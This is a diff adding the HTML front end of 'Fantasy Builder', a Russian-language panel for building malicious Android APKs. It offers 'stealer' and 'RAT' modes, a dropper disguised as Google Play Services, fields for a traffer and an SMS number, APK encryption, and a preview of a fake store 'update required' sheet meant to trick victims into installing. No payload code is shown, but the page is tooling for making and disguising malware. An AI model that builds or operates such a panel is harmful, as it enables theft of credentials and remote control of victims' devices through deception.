@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Fantasy Builder</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="style.css"/>
+<style>
+.build-status-msg {
+  margin: 10px 0 14px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  font-size: 13px;
+  font-weight: 500;
+  line-height: 1.5;
+  text-align: center;
+  animation: bsmFadeIn .3s ease;
+}
+@keyframes bsmFadeIn { from { opacity:0; transform:translateY(-4px); } to { opacity:1; transform:translateY(0); } }
+.bsm-queue  { background: rgba(234,179,8,.12);  border: 1px solid rgba(234,179,8,.35);  color: #fde68a; }
+.bsm-running{ background: rgba(99,102,241,.12); border: 1px solid rgba(99,102,241,.35); color: #a5b4fc; }
+.build-info-warn {
+  margin-top: 12px;
+  padding: 10px 14px;
+  border-radius: 10px;
+  font-size: 13px;
+  line-height: 1.5;
+  text-align: center;
+  background: rgba(239,68,68,.12);
+  border: 1px solid rgba(239,68,68,.35);
+  color: #fca5a5;
+}
+
+.build-overlay{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);z-index:9999;display:none;}
+.build-overlay.visible{display:block;}
+.build-overlay-box{background:rgba(15,17,23,.92);border:1px solid rgba(99,102,241,.4);border-radius:18px;padding:32px 40px;text-align:center;max-width:380px;box-shadow:0 8px 40px rgba(0,0,0,.6);}
+.build-overlay-icon{font-size:48px;margin-bottom:12px;animation:spin 2s linear infinite;}
+@keyframes spin{from{transform:rotate(0deg);}to{transform:rotate(360deg);}}
+.build-overlay-title{font-size:18px;font-weight:700;color:#e2e8f0;margin-bottom:8px;}
+.build-overlay-sub{font-size:13px;color:#94a3b8;line-height:1.5;}
+.build-overlay-warn{margin-top:14px;padding:8px 12px;border-radius:8px;background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.3);font-size:12px;color:#fca5a5;}
+
+.build-phase-label{font-size:12px;color:#64748b;text-align:center;margin-top:4px;min-height:18px;transition:color .3s;}
+</style>
+</head>
+<body>
+<div class="bg-aurora" aria-hidden="true">
+  <div class="aurora-orb orb-1"></div>
+  <div class="aurora-orb orb-2"></div>
+  <div class="aurora-orb orb-3"></div>
+</div>
+<div class="bg-grid" aria-hidden="true"></div>
+<div class="spotlight" id="spotlight" aria-hidden="true"></div>
+<div class="app-wrapper">
+  <header class="topbar">
+    <div class="topbar-logo">
+      <span class="logo-bolt">⚡</span>
+      <span class="logo-text">Fantasy<strong>Builder</strong></span>
+    </div>
+    <nav class="topbar-tabs" id="projectTabs" aria-label="Версия проекта">
+      <button class="tab active" data-project="v2" type="button">
+        <span class="tab-name">Лайт - Стил</span>
+      </button>
+      <button class="tab" data-project="v3" type="button">
+        <span class="tab-name">Полный - Рат</span>
+      </button>
+    </nav>
+  </header>
+  <section class="hero hero-compact" aria-label="Статус">
+    <div class="hero-status">
+      <span class="status-dot"></span>
+      СЕРВЕР · АКТИВЕН
+    </div>
+    <span class="vbadge vbadge-v2" id="vBadge">ЛАЙТ - СТИЛ</span>
+  </section>
+  <main class="bento-grid">
+    <div class="bcol bcol-left">
+      <div class="glass-card card-config" data-tilt>
+        <div class="card-hdr">
+          <span class="card-ico">⚙️</span>
+          <h2 class="card-ttl">Конфигурация</h2>
+        </div>
+        <div class="flds">
+          <input type="hidden" id="appName" value=""/>
+          <div class="frow">
+            <label class="flabel" for="prefix">Префикс пакета <span class="fhint">ровно 6 цифр</span><span class="req-star">*</span></label>
+            <input class="finput" id="prefix" type="text" maxlength="6" placeholder="777777" inputmode="numeric" autocomplete="off"/>
+            <div class="fval-msg" id="prefixError"></div>
+          </div>
+          <div class="frow" id="targetUrlRow">
+            <label class="flabel" for="targetUrl">Целевой URL <span class="inbadge v2">только Лайт - Стил</span><span class="req-star">*</span></label>
+            <input class="finput" id="targetUrl" type="text" placeholder="https://example.com" autocomplete="off"/>
+            <div class="fval-msg" id="targetUrlError"></div>
+          </div>
+          <div class="frow">
+            <label class="flabel" for="smsNumber">SMS номер <span class="fhint">RadioLink</span></label>
+            <input class="finput" id="smsNumber" type="text" placeholder="+70000000000" autocomplete="off"/>
+          </div>
+          <div class="frow">
+            <label class="flabel" for="traffer">Траффер</label>
+            <input class="finput" id="traffer" type="text" placeholder="—" autocomplete="off"/>
+          </div>
+        </div>
+        <div class="opt-group" id="settingsBlockRow" style="display:none">
+          <span class="opt-label">Блок настроек <span class="inbadge v3">Полный - Рат</span></span>
+          <div class="tgl-chips">
+            <label class="tgl-chip">
+              <input type="radio" name="settingsBlock" value="true" checked/>
+              <span>Включён</span>
+            </label>
+            <label class="tgl-chip">
+              <input type="radio" name="settingsBlock" value="false"/>
+              <span>Выключен</span>
+            </label>
+          </div>
+        </div>
+        <div class="card-glow"></div>
+      </div>
+      <div class="glass-card card-icon-upload" data-tilt>
+        <div class="card-hdr">
+          <span class="card-ico">🎨</span>
+          <h2 class="card-ttl">Иконка APK</h2>
+        </div>
+        <div class="icon-dropzone" id="iconZone">
+          <div class="icon-prev" id="iconPreview" data-emoji="📱">
+            <span>📱</span>
+          </div>
+          <div class="icon-dz-info">
+            <p class="icon-dz-title">Перетащите иконку</p>
+            <p class="icon-dz-sub">PNG / JPG · до 10 МБ · auto mipmap</p>
+            <div class="icon-dz-btns">
+              <button class="btn-ghost" id="iconSelectBtn" type="button">Выбрать файл</button>
+              <button class="btn-ghost btn-red" id="iconClearBtn" type="button" style="display:none">✕ Убрать</button>
+            </div>
+            <input type="file" id="iconFile" accept="image/*" style="display:none"/>
+          </div>
+        </div>
+        <div class="upstatus" id="iconStatus"></div>
+        <div class="field-error" id="iconError" style="display:none"></div>
+        <div class="card-glow"></div>
+      </div>
+    </div>
+    <div class="bcol bcol-right">
+      <div class="glass-card card-dropper">
+        <div class="card-hdr">
+          <span class="card-ico">🎭</span>
+          <h2 class="card-ttl">Дроппер</h2>
+        </div>
+        <div class="dropper-body">
+          <div class="frow">
+            <label class="flabel" for="dropperAppName">Название дроппера<span class="req-star">*</span></label>
+            <input class="finput" id="dropperAppName" type="text" placeholder="Google Play Сервисы" autocomplete="off"/>
+            <div class="fval-msg" id="dropperNameError"></div>
+          </div>
+          <div class="frow">
+            <span class="opt-label">Название APK</span>
+            <div class="tgl-chips">
+              <label class="tgl-chip">
+                <input type="radio" name="apkNameMode" value="same" checked/>
+                <span>То же что у дроппера</span>
+              </label>
+              <label class="tgl-chip">
+                <input type="radio" name="apkNameMode" value="custom"/>
+                <span>Отдельное</span>
+              </label>
+            </div>
+          </div>
+          <div class="frow" id="appNameCustomRow" style="display:none">
+            <label class="flabel" for="appNameCustom">Название APK</label>
+            <input class="finput" id="appNameCustom" type="text" placeholder="Приложение" autocomplete="off"/>
+          </div>
+          <div class="frow">
+            <label class="flabel" for="dropperUrl">URL дроппера<span class="req-star">*</span></label>
+            <input class="finput" id="dropperUrl" type="text" value="https://play.google.com/store/apps" autocomplete="off"/>
+            <div class="fval-msg" id="dropperUrlError"></div>
+          </div>
+          <div class="frow">
+            <span class="opt-label">Стор</span>
+            <div class="tgl-chips">
+              <label class="tgl-chip">
+                <input type="radio" name="dropperStore" value="google" checked/>
+                <span>Google Play</span>
+              </label>
+              <label class="tgl-chip">
+                <input type="radio" name="dropperStore" value="rustore"/>
+                <span>RuStore</span>
+              </label>
+            </div>
+          </div>
+          <div class="frow">
+            <span class="opt-label">Шифрование APK</span>
+            <div class="tgl-chips">
+              <label class="tgl-chip">
+                <input type="radio" name="encryption" value="no" checked/>
+                <span>Нет</span>
+              </label>
+              <label class="tgl-chip">
+                <input type="radio" name="encryption" value="yes"/>
+                <span>Да</span>
+              </label>
+            </div>
+          </div>
+          <div class="frow">
+            <span class="opt-label">Иконка дроппера</span>
+            <div class="tgl-chips">
+              <label class="tgl-chip">
+                <input type="radio" name="dropperIconMode" value="same" checked/>
+                <span>Та же что у APK</span>
+              </label>
+              <label class="tgl-chip">
+                <input type="radio" name="dropperIconMode" value="custom"/>
+                <span>Отдельная</span>
+              </label>
+            </div>
+          </div>
+          <div id="dropperIconRow" style="display:none">
+            <div class="drop-icon-row">
+              <div class="drop-icon-thumb" id="dropperIconThumb" data-emoji="📦"><span>📦</span></div>
+              <button class="btn-ghost btn-sm" id="dropperIconSelectBtn" type="button">Выбрать иконку</button>
+              <button class="btn-ghost btn-red btn-sm" id="dropperIconClearBtn" type="button" style="display:none">✕</button>
+              <input type="file" id="dropperIconFile" accept="image/*" style="display:none"/>
+            </div>
+            <div class="upstatus" id="dropperIconStatus"></div>
+          </div>
+        </div>
+        <div class="card-glow card-glow-purple"></div>
+      </div>
+    </div>
+  </main>
+  <section class="glass-card card-flags">
+    <div class="card-hdr">
+      <span class="card-ico">🚀</span>
+      <h2 class="card-ttl">Флаги сборки</h2>
+      <div class="flag-btns">
+        <button class="btn-micro" id="allOnBtn" type="button">Все вкл.</button>
+        <button class="btn-micro" id="allOffBtn" type="button">Все выкл.</button>
+      </div>
+    </div>
+    <div class="flags-scroll" id="featureGroups"></div>
+    <div class="card-glow card-glow-purple"></div>
+  </section>
+  <section class="glass-card card-preview-section">
+    <div class="card-hdr">
+      <span class="card-ico">📱</span>
+      <h2 class="card-ttl">Вид на устройстве</h2>
+      <span class="fhint">обновляется в реальном времени</span>
+    </div>
+    <div class="preview-section-body">
+      <div class="preview-phone">
+        <div class="ph-notch"></div>
+        <div class="ph-vol-up"></div>
+        <div class="ph-vol-dn"></div>
+        <div class="ph-pwr"></div>
+        <div class="ph-screen">
+          <div class="ph-statusbar">
+            <span class="ph-time">9:41</span>
+            <div class="ph-sb-right">
+              <span class="ph-sig">▲▲▲</span>
+              <span class="ph-batt">🔋</span>
+            </div>
+          </div>
+          <div class="ph-browser">
+            <iframe id="previewBgFrame" class="ph-bg-frame" src="about:blank" scrolling="no" style="width:390px;height:100%;border:none;transform-origin:top left;"></iframe>
+          </div>
+          <div class="ph-bottom-sheet" id="bloomSheet">
+            <div class="ph-sheet-drag"></div>
+            <div class="ph-sheet-store-row">
+              <svg class="ph-sheet-store-ico" id="previewStoreIcoGoogle" viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+                <path fill="none" d="M0,0h40v40H0V0z"/>
+                <path d="M19.7,19.2L4.3,35.3c0.5,1.7,2.1,3,4,3c0.8,0,1.5-.2,2.1-.6l17.4-9.9L19.7,19.2z" fill="#EA4335"/>
+                <path d="M35.3,16.4l-7.5-4.3-8.4,7.4,8.5,8.3,7.5-4.2c1.3-.7,2.2-2.1,2.2-3.6C37.5,18.5,36.6,17.1,35.3,16.4z" fill="#FBBC04"/>
+                <path d="M4.3,4.7C4.2,5,4.2,5.4,4.2,5.8v28.5c0,.4,0,.7.1,1.1l16-15.7L4.3,4.7z" fill="#4285F4"/>
+                <path d="M19.8,20l8-7.9L10.5,2.3C9.9,1.9,9.1,1.7,8.3,1.7c-1.9,0-3.6,1.3-4,3L19.8,20z" fill="#34A853"/>
+              </svg>
+              <svg class="ph-sheet-store-ico" id="previewStoreIcoRustore" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:none">
+                <path fill-rule="evenodd" clip-rule="evenodd" d="M17.28 36C9.13 36 5.06 36 2.53 33.47C0 30.94 0 26.87 0 18.72V17.28C0 9.13 0 5.06 2.53 2.53C5.06 0 9.13 0 17.28 0H18.72C26.87 0 30.94 0 33.47 2.53C36 5.06 36 9.13 36 17.28V18.72C36 26.87 36 30.94 33.47 33.47C30.94 36 26.87 36 18.72 36H17.28Z" fill="#0077FF"/>
+                <path d="M20.82 22.19C19.85 21.94 19.17 21.08 19.17 20.08V8.36C19.17 7.23 20.24 6.4 21.34 6.67L28.31 8.42C29.28 8.66 29.96 9.53 29.96 10.52V22.24C29.96 23.37 28.9 24.2 27.79 23.93L20.82 22.19Z" fill="white"/>
+                <path d="M7.69 27.58C6.72 27.34 6.04 26.47 6.04 25.48V13.76C6.04 12.63 7.1 11.8 8.2 12.07L15.18 13.81C16.15 14.06 16.83 14.92 16.83 15.92V27.64C16.83 28.77 15.76 29.6 14.66 29.33L7.69 27.58Z" fill="white"/>
+                <path d="M14.25 24.89C13.28 24.64 12.6 23.78 12.6 22.78V11.06C12.6 9.93 13.67 9.1 14.77 9.37L21.75 11.12C22.72 11.36 23.4 12.23 23.4 13.22V24.94C23.4 26.07 22.33 26.9 21.23 26.63L14.25 24.89Z" fill="white"/>
+              </svg>
+              <span class="ph-sheet-store-name" id="previewStoreName">Google Play</span>
+            </div>
+            <div class="ph-sheet-app-row">
+              <div class="ph-sheet-icon" id="previewIcon"><span>📦</span></div>
+              <div class="ph-sheet-meta">
+                <div class="ph-sheet-appname" id="previewAppName">Google Play Сервисы</div>
+                <div class="ph-sheet-app-sub">Размер: 4.6 МБ · Обновлено: сегодня</div>
+              </div>
+            </div>
+            <div class="ph-sheet-stats">
+              <div class="ph-sheet-stat">
+                <b>4.7 ★</b>
+                <span>9 тыс. оценок</span>
+              </div>
+              <div class="ph-sheet-sep"></div>
+              <div class="ph-sheet-stat">
+                <b>3+</b>
+                <span>Для всех</span>
+              </div>
+              <div class="ph-sheet-sep"></div>
+              <div class="ph-sheet-stat">
+                <b>349 тыс.+</b>
+                <span>Скачиваний</span>
+              </div>
+            </div>
+            <div class="ph-sheet-update-title">Доступно обновление</div>
+            <div class="ph-sheet-update-desc">Чтобы использовать приложение, необходимо установить обновление.</div>
+            <div class="ph-sheet-btn-row">
+              <button class="ph-sheet-more-btn" type="button">Подробнее</button>
+              <button class="ph-sheet-install-btn" id="previewInstallBtn" type="button">Установить</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <p class="preview-caption">Вид на устройстве пользователя</p>
+    </div>
+    <div class="card-glow card-glow-purple"></div>
+  </section>
+  <div class="build-zone">
+    <div class="build-zone-inner">
+      <button class="btn-build" id="buildBtn" type="button">
+        <span class="btn-build-body">
+          <span class="btn-build-icon" id="buildBtnIcon">🔨</span>
+          <span class="btn-build-text" id="buildBtnText">СОБРАТЬ APK</span>
+        </span>
+        <span class="btn-glow-halo"></span>
+      </button>
+      <div class="queue-lbl" id="queueInfo"></div>
+    </div>
+  </div>
+  <section class="glass-card card-progress" id="progressCard" style="display:none">
+    <div class="card-hdr">
+      <span class="card-ico">⚡</span>
+      <h2 class="card-ttl">Прогресс сборки</h2>
+      <span class="fhint mono" id="buildIdLabel"></span>
+    </div>
+    <div id="buildStatusMsg" class="build-status-msg" style="display:none"></div>
+    <div class="prog-track">
+      <div class="prog-fill" id="progressBar" style="width:0%">
+        <div class="prog-shimmer"></div>
+      </div>
+    </div>
+    <div class="prog-pct" id="progressPct">0%</div>
+    <div class="build-phase-label" id="buildPhaseLabel"></div>
+    <div class="build-result" id="buildResult"></div>
+    <div class="card-glow"></div>
+  </section>
+</div>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+<script src="/socket.io/socket.io.js"></script>
+<script src="app.js"></script>
+<script src="visual.js"></script>
+<script src="/template-mode.js"></script>
+<script src="/history-panel.js"></script>
+<div class="build-overlay" id="buildOverlay" aria-live="assertive">
+  <div class="build-overlay-box">
+    <div class="build-overlay-icon">⚙️</div>
+    <div class="build-overlay-title">Идёт сборка APK...</div>
+    <div class="build-overlay-sub">Пожалуйста, не закрывайте и не перезагружайте страницу.<br>Результат будет недоступен.</div>
+    <div class="build-overlay-warn">⚠️ F5 / закрытие вкладки = потеря APK</div>
+  </div>
+</div>
+</body>
+</html>
